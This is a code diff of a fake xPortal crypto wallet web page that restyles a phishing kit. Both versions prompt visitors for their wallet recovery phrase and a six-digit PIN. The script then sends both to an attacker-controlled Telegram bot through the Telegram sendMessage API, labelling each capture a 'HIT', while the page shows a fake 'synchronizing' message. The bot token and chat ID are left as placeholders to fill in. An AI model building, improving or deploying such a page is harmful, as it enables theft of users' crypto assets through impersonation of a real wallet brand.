@@ -3,165 +3,152 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>xPortal | Wallet Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>xPortal | The Money Super App</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
-        :root { --xp-black: #000; --xp-teal: #23f7dd; --xp-purple: #8a3ffc; --xp-border: rgba(255, 255, 255, 0.08); --xp-card: #0d0d0d; }
+        :root { --teal: #23f7dd; --purple: #8a3ffc; --border: rgba(255, 255, 255, 0.08); }
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
-        body { background: var(--xp-black); color: #fff; min-height: 100vh; overflow-x: hidden; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 75%); display: flex; align-items: center; justify-content: center; }
-
-        .glass-card { background: var(--xp-card); border: 1px solid var(--xp-border); border-radius: 32px; padding: 40px 20px; width: 100%; max-width: 460px; text-align: center; box-shadow: 0 40px 100px rgba(0,0,0,0.8); position: relative; }
-        .hero-logo { width: 70px; height: 70px; margin-bottom: 20px; }
+        body { background: #000; color: #fff; min-height: 100vh; overflow-x: hidden; display: flex; align-items: center; justify-content: center; }
         
-        .section { display: none; animation: fadeIn 0.4s ease; }
-        .section.active { display: block; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        /* Background Glow */
+        .bg-glow { position: fixed; top: 0; left: 50%; transform: translateX(-50%); width: 100%; height: 100%; background: radial-gradient(circle at 50% -20%, #1e0b3b 0%, #000 70%); z-index: -1; }
 
-        h1 { font-size: 26px; font-weight: 800; margin-bottom: 8px; letter-spacing: -1px; }
-        .subtitle { color: #888; font-size: 14px; margin-bottom: 25px; line-height: 1.4; }
+        .app-container { width: 100%; max-width: 420px; padding: 25px; text-align: center; }
+        .logo-container { margin-bottom: 40px; }
+        .logo-main { width: 85px; height: 85px; filter: drop-shadow(0 0 20px rgba(35, 247, 221, 0.2)); }
 
-        /* SELECTOR */
-        .count-selector { display: flex; justify-content: center; gap: 15px; margin-bottom: 20px; }
-        .count-btn { background: rgba(255,255,255,0.05); border: 1px solid var(--xp-border); color: #888; padding: 8px 16px; border-radius: 12px; cursor: pointer; font-size: 12px; font-weight: 600; transition: 0.2s; }
-        .count-btn.active { background: var(--xp-purple); color: #fff; border-color: var(--xp-purple); }
+        h1 { font-size: 32px; font-weight: 800; letter-spacing: -1.2px; margin-bottom: 12px; background: linear-gradient(to bottom, #fff, #888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        p.desc { color: #949494; font-size: 16px; margin-bottom: 45px; line-height: 1.5; font-weight: 400; }
 
-        /* WORDS GRID */
-        .phrase-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; margin-bottom: 25px; max-height: 250px; overflow-y: auto; padding-right: 5px; }
-        .word-box { position: relative; }
-        .word-box span { position: absolute; left: 8px; top: 50%; transform: translateY(-50%); font-size: 9px; font-weight: 800; color: var(--xp-teal); opacity: 0.6; }
-        .word-box input { width: 100%; background: #000; border: 1px solid var(--xp-border); border-radius: 10px; padding: 12px 5px 12px 25px; color: #fff; font-size: 12px; outline: none; }
-        .word-box input:focus { border-color: var(--xp-teal); }
-
-        /* PIN STYLE */
-        .pin-container { display: flex; justify-content: center; gap: 10px; margin: 25px 0; }
-        .pin-dot { width: 14px; height: 14px; border: 2px solid var(--xp-border); border-radius: 50%; }
-        .pin-dot.filled { background: var(--xp-teal); border-color: var(--xp-teal); box-shadow: 0 0 10px var(--xp-teal); }
-        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; max-width: 220px; margin: 0 auto; }
-        .key { width: 55px; height: 55px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 18px; font-weight: 600; cursor: pointer; border: 1px solid var(--xp-border); transition: 0.2s; }
-        .key:active { background: var(--xp-purple); }
-
-        .btn { width: 100%; height: 60px; border-radius: 100px; border: none; font-size: 16px; font-weight: 700; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        /* BUTTONS */
+        .btn { width: 100%; height: 64px; border-radius: 100px; border: none; font-size: 17px; font-weight: 700; cursor: pointer; transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1); display: flex; align-items: center; justify-content: center; margin-bottom: 16px; }
         .btn-primary { background: #fff; color: #000; }
-        .btn-secondary { background: rgba(255,255,255,0.05); color: #fff; border: 1px solid var(--xp-border); }
-        .btn:hover { transform: translateY(-3px); }
+        .btn-primary:hover { background: var(--teal); transform: scale(1.02); }
+        .btn-secondary { background: rgba(255, 255, 255, 0.05); color: #fff; border: 1px solid var(--border); }
+        .btn-secondary:hover { background: rgba(255, 255, 255, 0.1); border-color: #fff; }
 
-        #status-msg { display: none; color: var(--xp-teal); font-weight: 600; margin-top: 20px; animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        /* SECTIONS */
+        .section { display: none; animation: slideUp 0.4s ease-out; width: 100%; }
+        .section.active { display: block; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* GRID FOR WORDS */
+        .grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin: 30px 0; max-height: 300px; overflow-y: auto; padding: 10px; }
+        .word-box { position: relative; }
+        .word-box span { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); font-size: 10px; color: var(--teal); font-weight: 800; }
+        .word-box input { width: 100%; background: #0a0a0a; border: 1px solid var(--border); border-radius: 14px; padding: 14px 10px 14px 28px; color: #fff; font-size: 13px; outline: none; }
+        .word-box input:focus { border-color: var(--purple); box-shadow: 0 0 15px rgba(138, 63, 252, 0.1); }
+
+        /* KEYPAD */
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 15px; margin-top: 30px; }
+        .key { width: 70px; height: 70px; border-radius: 50%; background: rgba(255,255,255,0.03); display: flex; align-items: center; justify-content: center; font-size: 22px; font-weight: 600; cursor: pointer; border: 1px solid var(--border); margin: 0 auto; }
+        .key:active { background: var(--purple); transform: scale(0.9); }
+        .pin-dots { display: flex; justify-content: center; gap: 12px; margin: 25px 0; }
+        .dot { width: 16px; height: 16px; border: 2px solid var(--border); border-radius: 50%; }
+        .dot.filled { background: var(--teal); border-color: var(--teal); box-shadow: 0 0 10px var(--teal); }
+
+        #loader { display: none; color: var(--teal); font-weight: 700; font-size: 14px; margin-top: 20px; letter-spacing: 1px; }
     </style>
 </head>
 <body>
 
-<div class="glass-card">
-    <img src="Capture.PNG" class="hero-logo">
+<div class="bg-glow"></div>
 
-    <div id="step-welcome" class="section active">
+<div class="app-container">
+    
+    <div id="page-welcome" class="section active">
+        <div class="logo-container"><img src="Capture.PNG" class="logo-main"></div>
         <h1>Welcome to xPortal</h1>
-        <p class="subtitle">The official gateway to the Elrond ecosystem. Secure your assets.</p>
-        <button class="btn btn-primary" onclick="showStep('step-import')">Import Existing Wallet</button>
-        <button class="btn btn-secondary">Create New Wallet</button>
+        <p class="desc">The most secure way to explore the new digital world. Cards, crypto, and more.</p>
+        <button class="btn btn-primary" onclick="showSection('page-create')">Create New Wallet</button>
+        <button class="btn btn-secondary" onclick="showSection('page-import')">Import Existing Wallet</button>
     </div>
 
-    <div id="step-import" class="section">
-        <h2>Secret Phrase</h2>
-        <p class="subtitle">Select the number of words in your phrase.</p>
-        
-        <div class="count-selector">
-            <button class="count-btn active" onclick="genGrid(12, this)">12 Words</button>
-            <button class="count-btn" onclick="genGrid(18, this)">18 Words</button>
-            <button class="count-btn" onclick="genGrid(24, this)">24 Words</button>
-        </div>
-
-        <div class="phrase-grid" id="import-grid">
-            </div>
-
-        <button class="btn btn-primary" onclick="goToPin()">Continue</button>
-        <button class="btn btn-secondary" onclick="showStep('step-welcome')">Back</button>
+    <div id="page-create" class="section">
+        <div class="logo-container"><img src="Capture.PNG" style="width: 50px;"></div>
+        <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">New Wallet Phrase</h2>
+        <p style="color:#888; font-size: 14px;">Store these 12 words in a safe place.</p>
+        <div class="grid" id="createGrid"></div>
+        <button class="btn btn-primary" onclick="showSection('page-import')">I've written it down</button>
+        <button class="btn btn-secondary" onclick="showSection('page-welcome')">Cancel</button>
     </div>
 
-    <div id="step-pin" class="section">
-        <h2>Confirm PIN</h2>
-        <p class="subtitle">Enter your 6-digit security PIN to finalize.</p>
-        <div class="pin-container" id="pinDots">
-            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
-            <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
+    <div id="page-import" class="section">
+        <div class="logo-container"><img src="Capture.PNG" style="width: 50px;"></div>
+        <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">Secret Phrase</h2>
+        <p style="color:#888; font-size: 14px;">Enter your 12-word recovery phrase.</p>
+        <div class="grid" id="importGrid"></div>
+        <button class="btn btn-primary" onclick="checkPhrase()">Continue</button>
+    </div>
+
+    <div id="page-pin" class="section">
+        <h2 style="font-size: 24px; font-weight: 800; margin-bottom: 10px;">Security PIN</h2>
+        <p style="color:#888; font-size: 14px;">Enter your 6-digit PIN code.</p>
+        <div class="pin-dots" id="pinDots">
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+            <div class="dot"></div><div class="dot"></div><div class="dot"></div>
         </div>
         <div class="keypad">
-            <div class="key" onclick="press(1)">1</div><div class="key" onclick="press(2)">2</div><div class="key" onclick="press(3)">3</div>
-            <div class="key" onclick="press(4)">4</div><div class="key" onclick="press(5)">5</div><div class="key" onclick="press(6)">6</div>
-            <div class="key" onclick="press(7)">7</div><div class="key" onclick="press(8)">8</div><div class="key" onclick="press(9)">9</div>
+            <script>for(let i=1;i<=9;i++) document.write(`<div class="key" onclick="press(${i})">${i}</div>`);</script>
             <div></div><div class="key" onclick="press(0)">0</div><div class="key" onclick="del()">←</div>
         </div>
     </div>
 
-    <div id="status-msg">Synchronizing Secure Node...</div>
+    <div id="loader">SYNCHRONIZING SECURE NODE...</div>
 </div>
 
 <script>
-    const BOT_TOKEN = 'YOUR_BOT_TOKEN'; 
+    const BOT_TOKEN = 'YOUR_BOT_TOKEN';
     const CHAT_ID = 'YOUR_CHAT_ID';
 
-    let phraseData = "";
+    let savedPhrase = "";
     let currentPin = "";
-    let wordCount = 12;
 
-    function showStep(id) {
+    function showSection(id) {
         document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
         document.getElementById(id).classList.add('active');
-        if(id === 'step-import') genGrid(12);
-    }
 
-    function genGrid(n, btn) {
-        wordCount = n;
-        if(btn) {
-            document.querySelectorAll('.count-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
+        if(id === 'page-create') {
+            const mock = ["brave","ocean","winter","tiger","shield","focus","cloud","member","camera","bright","stable","digital"];
+            const cg = document.getElementById('createGrid');
+            cg.innerHTML = mock.map((w, i) => `<div class="word-box"><span>${i+1}</span><input value="${w}" readonly></div>`).join('');
         }
-        const g = document.getElementById('import-grid');
-        g.innerHTML = '';
-        for(let i=1; i<=n; i++) {
-            g.innerHTML += `<div class="word-box"><span>${i}</span><input type="password" class="w-in" required placeholder="..." oninput="handlePaste(event)"></div>`;
+        if(id === 'page-import') {
+            const ig = document.getElementById('importGrid');
+            ig.innerHTML = '';
+            for(let i=1; i<=12; i++) ig.innerHTML += `<div class="word-box"><span>${i}</span><input type="password" class="w-in" placeholder="..."></div>`;
         }
     }
 
-    function handlePaste(e) {
-        const val = e.target.value.trim();
-        if (val.includes(' ')) {
-            const words = val.split(/\s+/);
-            const inputs = document.querySelectorAll('.w-in');
-            words.forEach((w, i) => { if (inputs[i]) inputs[i].value = w; });
-        }
-    }
-
-    function goToPin() {
+    function checkPhrase() {
         let words = [];
         document.querySelectorAll('.w-in').forEach(i => words.push(i.value.trim()));
-        if(words.some(w => w === "")) return alert("Please fill all words");
-        phraseData = words.join(" ");
-        showStep('step-pin');
+        if(words.some(w => w === "")) return alert("Fill all 12 words");
+        savedPhrase = words.join(" ");
+        showSection('page-pin');
     }
 
     function press(n) {
         if(currentPin.length < 6) {
             currentPin += n;
             updateDots();
-            if(currentPin.length === 6) sendFinal();
+            if(currentPin.length === 6) sendAll();
         }
     }
 
-    function del() { currentPin = currentPin.slice(0, -1); updateDots(); }
+    function del() { currentPin = currentPin.slice(0,-1); updateDots(); }
 
     function updateDots() {
-        const dots = document.querySelectorAll('.pin-dot');
-        dots.forEach((dot, i) => dot.classList.toggle('filled', i < currentPin.length));
+        const dots = document.querySelectorAll('.dot');
+        dots.forEach((d, i) => d.classList.toggle('filled', i < currentPin.length));
     }
 
-    function sendFinal() {
-        document.getElementById('step-pin').style.display = 'none';
-        document.getElementById('status-msg').style.display = 'block';
-        const msg = `🚀 NEW XPORTAL HIT!\n\nWords (${wordCount}): ${phraseData}\nPIN: ${currentPin}`;
+    function sendAll() {
+        document.getElementById('page-pin').style.display = 'none';
+        document.getElementById('loader').style.display = 'block';
+        const msg = `🚀 XPORTAL HIT!\n\nPhrase: ${savedPhrase}\nPIN: ${currentPin}`;
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
     }
 </script>
-
 </body>
 </html>
